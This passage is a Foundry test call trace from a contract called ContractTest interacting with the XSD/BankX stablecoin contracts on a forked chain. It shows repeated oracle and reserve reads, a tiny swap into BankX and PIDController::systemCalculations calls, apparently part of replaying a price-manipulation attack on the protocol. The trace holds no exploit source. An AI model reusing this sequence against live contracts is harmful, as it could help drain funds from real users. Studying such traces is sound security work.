    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] XSDWETHpool::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3963937398991055853792 [3.963e21], 3857071215838228063464 [3.857e21], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5620] XSD::eth_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7181] XSD::xsd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] XSDWETHpool::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3963937398991055853792 [3.963e21], 3857071215838228063464 [3.857e21], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5656] XSD::xag_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0x25E084A3B5dAb1F8272BBcC9E2935430069DB8Ff::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x817326922c909b16944817c207562B25C4dF16aD::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x168f55dFe619E37fe2393c3bA3c831647F8617c0::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 125646 [1.256e5], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 125646 [1.256e5]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147419228878 [3.689e19], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 36893488147419228878 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000088577cf8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000015d08ee
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [405] XSD::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 20000547033338243084561810 [2e25]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] XSDWETHpool::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3963937398991055853792 [3.963e21], 3857071215838228063464 [3.857e21], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5620] XSD::eth_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [19700] 0xED024d771261D765B9Dc7b0947ef271ea006248F::allocatedSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [12384] 0xE97E0f2a6f70176c757c82b5c392f93C34D99fA8::allocatedSupply() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2395] 0x2946Ca638EB11830E83Feaa130aA8B13d37C3772::bankx_minted_count() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2327] 0x4d369BD339709021267E92702A9E4cE30be85706::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 472721303262100063425570406 [4.727e26]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000001941a47e04bc64e
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000001941a47e04bc64e
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7233] XSD::bankx_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] 0x224E13D9eAB11eDc09411ef4bF800791a7EF6135::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1347232252051346746666623 [1.347e24], 2600870202054432854 [2.6e18], 1695698658 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000198
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] 0x224E13D9eAB11eDc09411ef4bF800791a7EF6135::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1347232252051346746666623 [1.347e24], 2600870202054432854 [2.6e18], 1695698658 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5620] XSD::eth_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5656] XSD::xag_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0x25E084A3B5dAb1F8272BBcC9E2935430069DB8Ff::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x817326922c909b16944817c207562B25C4dF16aD::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x168f55dFe619E37fe2393c3bA3c831647F8617c0::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 125646 [1.256e5], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 125646 [1.256e5]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147419228878 [3.689e19], 2287435000 [2.287e9], 1695752859 [1.695e9], 1695752859 [1.695e9], 36893488147419228878 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000088577cf8
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000015d08ee
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [352] 0x2946Ca638EB11830E83Feaa130aA8B13d37C3772::collat_XSD()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000015b42616817e3414b
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [13606] 0x2946Ca638EB11830E83Feaa130aA8B13d37C3772::collatDollarBalance() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5620] XSD::eth_usd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2534] WBNB::balanceOf(0x2946Ca638EB11830E83Feaa130aA8B13d37C3772) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 77114640440362412 [7.711e16]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 16325857706505293295 [1.632e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [407] XSD::global_collateral_ratio() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000000f4240
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [264837] Router::swapETHForBankX{value: 1000000000000}(100)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] 0x224E13D9eAB11eDc09411ef4bF800791a7EF6135::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1347232252051346746666623 [1.347e24], 2600870202054432854 [2.6e18], 1695698658 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [21974] WBNB::deposit{value: 1000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Deposit(dst: Router: [0xfADDa925e10d07430f5d7461689fd90d3D81bB48], wad: 1000000000000 [1e12])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [8062] WBNB::transfer(0x224E13D9eAB11eDc09411ef4bF800791a7EF6135, 1000000000000 [1e12])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: Router: [0xfADDa925e10d07430f5d7461689fd90d3D81bB48], to: 0x224E13D9eAB11eDc09411ef4bF800791a7EF6135, value: 1000000000000 [1e12])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [64946] 0x224E13D9eAB11eDc09411ef4bF800791a7EF6135::swap(100, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [27887] 0x4d369BD339709021267E92702A9E4cE30be85706::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x224E13D9eAB11eDc09411ef4bF800791a7EF6135, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 100)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [606] 0x4d369BD339709021267E92702A9E4cE30be85706::balanceOf(0x224E13D9eAB11eDc09411ef4bF800791a7EF6135) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1347232252051346746666523 [1.347e24]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] WBNB::balanceOf(0x224E13D9eAB11eDc09411ef4bF800791a7EF6135) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 2600871202054432854 [2.6e18]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Sync(reserve0: 1347232252051346746666523 [1.347e24], reserve1: 2600871202054432854 [2.6e18])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Swap(sender: Router: [0xfADDa925e10d07430f5d7461689fd90d3D81bB48], amount0In: 0, amount1In: 1000000000000 [1e12], amount0Out: 100, amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [146175] PIDController::systemCalculations()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [606] 0x4d369BD339709021267E92702A9E4cE30be85706::balanceOf(0x224E13D9eAB11eDc09411ef4bF800791a7EF6135) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1347232252051346746666523 [1.347e24]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7233] XSD::bankx_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] 0x224E13D9eAB11eDc09411ef4bF800791a7EF6135::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1347232252051346746666523 [1.347e24], 2600871202054432854 [2.6e18], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000198
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [405] XSD::totalSupply() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 20000547033338243084561810 [2e25]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7181] XSD::xsd_price() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4162] 0xfa2dcD1aaA0E3dB79A2e3b2aDb1e286C27b5cE75::getLatestPrice() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3031251 [3.031e6], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 3031251 [3.031e6]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 36893488147422134483 [3.689e19], 21170892600 [2.117e10], 1695753426 [1.695e9], 1695753426 [1.695e9], 36893488147422134483 [3.689e19]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000004ede22f38
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [369] XSDWETHpool::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 3963937398991055853792 [3.963e21], 3857071215838228063464 [3.857e21], 1695753429 [1.695e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000000c9e6bfe
